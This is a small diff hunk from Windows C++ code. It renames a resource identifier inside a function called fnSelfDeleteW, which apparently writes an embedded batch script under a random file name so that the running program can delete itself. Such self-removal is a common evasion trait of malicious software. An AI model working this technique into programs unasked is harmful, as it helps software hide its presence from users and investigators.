@@ -132,7 +132,7 @@ BOOL fnSelfDeleteW(VOID) {
 	HANDLE hHeap = GetProcessHeap();
 	std::wstring szBat = szCd + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".bat";
 
-	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA_0x01, RT_RCDATA, &dwBufferSize);
+	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA101, RT_RCDATA, &dwBufferSize);
 	if (lpBuffer) {
 		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (dwBufferSize + ((lstrlen(szMfn) * 2) * 2) + (lstrlen(szBat.c_str()))));
 		if (pszDest) {
